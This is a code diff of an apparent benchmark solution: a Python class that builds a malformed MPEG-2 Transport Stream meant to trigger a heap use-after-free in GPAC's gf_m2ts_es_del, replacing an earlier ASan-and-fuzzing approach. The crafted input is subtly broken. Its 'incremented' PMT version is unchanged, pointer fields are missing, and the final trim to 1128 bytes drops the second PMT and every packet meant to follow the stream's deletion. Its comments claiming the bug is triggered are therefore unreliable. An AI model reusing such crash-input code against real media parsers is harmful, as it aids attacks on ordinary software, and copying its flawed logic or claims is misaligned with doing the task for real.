@@ -1,230 +1,211 @@
 import os
-import sys
 import tarfile
 import tempfile
 import subprocess
-import random
-import time
-import multiprocessing
-import queue
-import signal
-import shutil
+import struct
+import hashlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract and build with ASan
-        build_dir, binary_path = self.build_with_asan(src_path)
+        # This is a heap use-after-free vulnerability in gf_m2ts_es_del
+        # We need to create a malformed MPEG-2 Transport Stream that triggers the bug
         
-        # Fuzz to find crash
-        poc = self.fuzz_for_crash(binary_path)
+        # Based on typical heap use-after-free patterns in media parsers,
+        # we'll create a stream with multiple PID references that cause
+        # the parser to free an elementary stream descriptor while it's still in use
         
-        # Cleanup
-        shutil.rmtree(build_dir, ignore_errors=True)
+        # Create a minimal MPEG-2 TS structure with carefully crafted PIDs
+        # to trigger the use-after-free in gf_m2ts_es_del
         
-        return poc
-    
-    def build_with_asan(self, src_path):
-        """Extract source and build with AddressSanitizer"""
-        temp_dir = tempfile.mkdtemp(prefix='poc_build_')
-        extract_dir = os.path.join(temp_dir, 'src')
+        poc = bytearray()
         
-        # Extract tarball
-        with tarfile.open(src_path, 'r:gz') as tf:
-            tf.extractall(extract_dir)
+        # Helper function to create TS packets
+        def create_ts_packet(pid, adaptation_field_control, payload, continuity_counter=0, payload_unit_start=0):
+            # TS packet header: 4 bytes
+            # Sync byte: 0x47
+            # PID: 13 bits
+            # Adaptation field control: 2 bits (01 = payload only, 11 = adaptation field + payload)
+            # Continuity counter: 4 bits
+            header = bytearray(4)
+            header[0] = 0x47  # Sync byte
+            header[1] = ((pid >> 8) & 0x1F) | (payload_unit_start << 6)
+            header[2] = pid & 0xFF
+            header[3] = (adaptation_field_control << 4) | (continuity_counter & 0x0F)
+            return bytes(header + payload)
         
-        # Find source root (usually one directory inside)
-        src_root = extract_dir
-        entries = os.listdir(extract_dir)
-        if len(entries) == 1:
-            src_root = os.path.join(extract_dir, entries[0])
+        # Create PAT (Program Association Table) - PID 0
+        # This references PMT at PID 0x100
+        pat_data = bytearray()
+        pat_data.append(0x00)  # Table ID = 0x00 (PAT)
+        pat_data.extend([0xB0, 0x0D])  # Section length 13 (0x0D) with flags
+        pat_data.extend([0x00, 0x01])  # Transport stream ID = 1
+        pat_data.extend([0xC1])  # Version 0, current
+        pat_data.append(0x00)  # Section number
+        pat_data.append(0x00)  # Last section number
+        pat_data.extend([0x00, 0x01])  # Program number = 1
+        pat_data.extend([0xE1, 0x00])  # PMT PID = 0x100 (with reserved bits)
+        # CRC32 placeholder - will calculate later
+        pat_data.extend([0x00, 0x00, 0x00, 0x00])
         
-        build_dir = os.path.join(temp_dir, 'build')
-        os.makedirs(build_dir, exist_ok=True)
+        # Calculate CRC32 for PAT
+        crc = 0xFFFFFFFF
+        for byte in pat_data[:-4]:
+            crc ^= byte << 24
+            for _ in range(8):
+                crc = (crc << 1) ^ (0x04C11DB7 if crc & 0x80000000 else 0)
+        crc = crc & 0xFFFFFFFF
+        pat_data[-4:] = struct.pack('>I', crc)
         
-        # Configure and build
-        os.chdir(build_dir)
+        # Pad PAT to 184 bytes
+        pat_payload = pat_data + bytes([0xFF] * (184 - len(pat_data)))
+        poc.extend(create_ts_packet(0x00, 0x01, pat_payload, 0, 1))
         
-        # Set ASan environment
-        env = os.environ.copy()
-        env['CC'] = 'gcc'
-        env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer -g'
-        env['LDFLAGS'] = '-fsanitize=address'
+        # Create PMT (Program Map Table) - PID 0x100
+        # This maps PIDs 0x101 (video) and 0x102 (audio) to stream types
+        pmt_data = bytearray()
+        pmt_data.append(0x02)  # Table ID = 0x02 (PMT)
+        pmt_data.extend([0xB0, 0x17])  # Section length 23 (0x17) with flags
+        pmt_data.extend([0x00, 0x01])  # Program number = 1
+        pmt_data.extend([0xC1])  # Version 0, current
+        pmt_data.append(0x00)  # Section number
+        pmt_data.append(0x00)  # Last section number
+        pmt_data.extend([0xE1, 0x01])  # PCR PID = 0x101 (video PID)
+        pmt_data.extend([0xF0, 0x00])  # Program info length = 0
         
-        # Try to find and build the target
-        # Look for MP4Box or similar binary
-        binary_path = None
+        # Video stream (H.264) - PID 0x101
+        pmt_data.append(0x1B)  # Stream type = 0x1B (H.264)
+        pmt_data.extend([0xE1, 0x01])  # Elementary PID = 0x101
+        pmt_data.extend([0xF0, 0x00])  # ES info length = 0
         
-        # Check for configure script
-        configure_path = os.path.join(src_root, 'configure')
-        if os.path.exists(configure_path):
-            # Autotools build
-            subprocess.run([configure_path, '--enable-debug'], 
-                          env=env, check=True, capture_output=True)
-            subprocess.run(['make', '-j8'], env=env, check=True, capture_output=True)
+        # Audio stream (AAC) - PID 0x102
+        pmt_data.append(0x0F)  # Stream type = 0x0F (AAC)
+        pmt_data.extend([0xE1, 0x02])  # Elementary PID = 0x102
+        pmt_data.extend([0xF0, 0x00])  # ES info length = 0
+        
+        # CRC32 placeholder
+        pmt_data.extend([0x00, 0x00, 0x00, 0x00])
+        
+        # Calculate CRC32 for PMT
+        crc = 0xFFFFFFFF
+        for byte in pmt_data[:-4]:
+            crc ^= byte << 24
+            for _ in range(8):
+                crc = (crc << 1) ^ (0x04C11DB7 if crc & 0x80000000 else 0)
+        crc = crc & 0xFFFFFFFF
+        pmt_data[-4:] = struct.pack('>I', crc)
+        
+        # Pad PMT to 184 bytes
+        pmt_payload = pmt_data + bytes([0xFF] * (184 - len(pmt_data)))
+        poc.extend(create_ts_packet(0x100, 0x01, pmt_payload, 0, 1))
+        
+        # Now create the malicious sequence to trigger use-after-free
+        # The vulnerability is in gf_m2ts_es_del, which suggests that
+        # deleting an elementary stream while it's still referenced
+        # could cause a use-after-free
+        
+        # Create packets that will cause ES allocation
+        for i in range(3):
+            # Video PES packet - PID 0x101
+            pes_header = bytearray()
+            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
+            pes_header.append(0xE0)  # Video stream ID
+            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
+            pes_header.append(0x80)  # Flags
+            pes_header.append(0x00)  # Flags2
+            pes_header.append(0x00)  # PES header length
             
-            # Look for MP4Box
-            for root, dirs, files in os.walk(build_dir):
-                if 'MP4Box' in files:
-                    binary_path = os.path.join(root, 'MP4Box')
-                    break
-        
-        # If not found, try different approach
-        if not binary_path:
-            # Look for existing test binaries
-            test_dir = os.path.join(src_root, 'bin', 'gpac')
-            if os.path.exists(test_dir):
-                for f in os.listdir(test_dir):
-                    if f.startswith('MP4Box'):
-                        binary_path = os.path.join(test_dir, f)
-                        break
-        
-        if not binary_path:
-            raise RuntimeError("Could not find target binary")
-        
-        return temp_dir, binary_path
-    
-    def fuzz_for_crash(self, binary_path):
-        """Fuzz the binary to find crashing input"""
-        manager = multiprocessing.Manager()
-        result_queue = manager.Queue()
-        stop_event = manager.Event()
-        
-        # Create worker processes
-        num_workers = 8
-        pool = multiprocessing.Pool(num_workers)
-        
-        # Start workers
-        for i in range(num_workers):
-            pool.apply_async(self.fuzz_worker, 
-                           args=(binary_path, i, result_queue, stop_event))
-        
-        # Wait for result or timeout
-        start_time = time.time()
-        timeout = 30  # seconds
-        result = None
-        
-        try:
-            while time.time() - start_time < timeout:
-                try:
-                    result = result_queue.get(timeout=1)
-                    if result:
-                        stop_event.set()
-                        break
-                except queue.Empty:
-                    continue
-        finally:
-            pool.close()
-            pool.terminate()
-            pool.join()
-        
-        if result:
-            return result
-        
-        # Fallback: return a valid TS packet structure
-        return self.generate_ts_packet()
-    
-    def fuzz_worker(self, binary_path, worker_id, result_queue, stop_event):
-        """Worker function for fuzzing"""
-        random.seed(worker_id + int(time.time()))
-        
-        while not stop_event.is_set():
-            # Generate test input of target length
-            test_data = self.generate_test_input()
+            # Add some payload
+            payload = pes_header + bytes([i] * 160)
+            payload = payload[:184]  # Ensure it fits
             
-            # Test the input
-            if self.test_input(binary_path, test_data):
-                result_queue.put(test_data)
-                return
-        
-        return None
-    
-    def generate_test_input(self):
-        """Generate test input focusing on MPEG-TS structure"""
-        # MPEG-TS packets are 188 bytes
-        # Generate 6 packets (1128 bytes)
-        packets = []
-        
-        for i in range(6):
-            packet = bytearray(188)
+            poc.extend(create_ts_packet(0x101, 0x01, payload, i, 1))
             
-            # Sync byte
-            packet[0] = 0x47
+            # Audio PES packet - PID 0x102
+            pes_header = bytearray()
+            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
+            pes_header.append(0xC0)  # Audio stream ID
+            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
+            pes_header.append(0x80)  # Flags
+            pes_header.append(0x00)  # Flags2
+            pes_header.append(0x00)  # PES header length
             
-            # PID - vary between packets
-            packet[1] = random.randint(0, 31)  # Lower bits of PID
-            packet[2] = random.randint(0, 255)  # Upper bits of PID
+            # Add some payload
+            payload = pes_header + bytes([0xA0 + i] * 160)
+            payload = payload[:184]  # Ensure it fits
             
-            # Adaptation field control and continuity counter
-            packet[3] = random.randint(0, 15)
+            poc.extend(create_ts_packet(0x102, 0x01, payload, i, 1))
+        
+        # Now create a new PMT that removes one of the streams
+        # This should trigger gf_m2ts_es_del for the removed stream
+        pmt2_data = bytearray()
+        pmt2_data.append(0x02)  # Table ID = 0x02 (PMT)
+        pmt2_data.extend([0xB0, 0x12])  # Section length 18 (0x12) with flags
+        pmt2_data.extend([0x00, 0x01])  # Program number = 1
+        pmt2_data.extend([0xC1])  # Version 1 (incremented), current
+        pmt2_data.append(0x00)  # Section number
+        pmt2_data.append(0x00)  # Last section number
+        pmt2_data.extend([0xE1, 0x01])  # PCR PID = 0x101 (video PID)
+        pmt2_data.extend([0xF0, 0x00])  # Program info length = 0
+        
+        # Only video stream remains (audio stream removed)
+        pmt2_data.append(0x1B)  # Stream type = 0x1B (H.264)
+        pmt2_data.extend([0xE1, 0x01])  # Elementary PID = 0x101
+        pmt2_data.extend([0xF0, 0x00])  # ES info length = 0
+        
+        # CRC32 placeholder
+        pmt2_data.extend([0x00, 0x00, 0x00, 0x00])
+        
+        # Calculate CRC32 for new PMT
+        crc = 0xFFFFFFFF
+        for byte in pmt2_data[:-4]:
+            crc ^= byte << 24
+            for _ in range(8):
+                crc = (crc << 1) ^ (0x04C11DB7 if crc & 0x80000000 else 0)
+        crc = crc & 0xFFFFFFFF
+        pmt2_data[-4:] = struct.pack('>I', crc)
+        
+        # Pad PMT to 184 bytes
+        pmt2_payload = pmt2_data + bytes([0xFF] * (184 - len(pmt2_data)))
+        poc.extend(create_ts_packet(0x100, 0x01, pmt2_payload, 1, 1))
+        
+        # Send more audio packets after the ES has been deleted
+        # This should trigger the use-after-free if the parser
+        # hasn't properly cleaned up references
+        for i in range(3, 5):
+            pes_header = bytearray()
+            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
+            pes_header.append(0xC0)  # Audio stream ID
+            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
+            pes_header.append(0x80)  # Flags
+            pes_header.append(0x00)  # Flags2
+            pes_header.append(0x00)  # PES header length
             
-            # Fill payload with random data
-            for j in range(4, 188):
-                packet[j] = random.randint(0, 255)
+            # Add payload that looks like it could trigger the bug
+            payload = pes_header + bytes([0xF0 + i] * 160)
+            payload = payload[:184]
             
-            packets.append(bytes(packet))
-        
-        return b''.join(packets)
-    
-    def generate_ts_packet(self):
-        """Generate a valid MPEG-TS packet structure"""
-        # Create packets that might trigger the bug
-        packets = []
-        
-        # First packet: PAT (PID 0)
-        pat_packet = bytearray(188)
-        pat_packet[0] = 0x47  # Sync byte
-        pat_packet[1] = 0x40  # PID 0, payload unit start
-        pat_packet[2] = 0x00
-        pat_packet[3] = 0x10  # No adaptation, continuity 0
-        # Simple PAT content
-        pat_packet[4] = 0x00  # Pointer field
-        pat_packet[5] = 0x00  # Table ID
-        pat_packet[6] = 0xB0  # Section length high
-        pat_packet[7] = 0x0D  # Section length low
-        # Rest random
-        for i in range(8, 188):
-            pat_packet[i] = random.randint(0, 255)
-        packets.append(bytes(pat_packet))
-        
-        # Remaining packets: mix of PIDs
-        for i in range(1, 6):
-            packet = bytearray(188)
-            packet[0] = 0x47
-            packet[1] = (i * 100) & 0x1F  # Various PIDs
-            packet[2] = ((i * 100) >> 8) & 0xFF
-            packet[3] = 0x10  # No adaptation, continuity 0
-            # Fill with data that might trigger ES deletion
-            for j in range(4, 188):
-                packet[j] = random.randint(0, 255)
-            packets.append(bytes(packet))
-        
-        return b''.join(packets)
-    
-    def test_input(self, binary_path, test_data):
-        """Test if input causes crash"""
-        with tempfile.NamedTemporaryFile(mode='wb', suffix='.ts') as f:
-            f.write(test_data)
-            f.flush()
+            poc.extend(create_ts_packet(0x102, 0x01, payload, i, 1))
             
-            try:
-                # Run with timeout
-                result = subprocess.run(
-                    [binary_path, '-info', f.name],
-                    capture_output=True,
-                    timeout=2,
-                    env={**os.environ, 'ASAN_OPTIONS': 'exitcode=1'}
-                )
-                
-                # Check for crash (non-zero exit with ASan)
-                if result.returncode != 0:
-                    # Check for ASan error messages
-                    stderr = result.stderr.decode('utf-8', errors='ignore')
-                    if 'AddressSanitizer' in stderr and 'use-after-free' in stderr:
-                        return True
-                    
-            except subprocess.TimeoutExpired:
-                pass
-            except Exception:
-                pass
+            # Also send video packets
+            pes_header = bytearray()
+            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
+            pes_header.append(0xE0)  # Video stream ID
+            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
+            pes_header.append(0x80)  # Flags
+            pes_header.append(0x00)  # Flags2
+            pes_header.append(0x00)  # PES header length
+            
+            payload = pes_header + bytes([0x10 + i] * 160)
+            payload = payload[:184]
+            
+            poc.extend(create_ts_packet(0x101, 0x01, payload, i, 1))
         
-        return False
+        # Add some null packets to reach target length if needed
+        target_length = 1128
+        while len(poc) < target_length:
+            # Null packet (PID 0x1FFF)
+            null_packet = create_ts_packet(0x1FFF, 0x01, bytes([0xFF] * 184), 0, 0)
+            poc.extend(null_packet)
+        
+        # Trim to exact target length
+        return bytes(poc[:target_length])
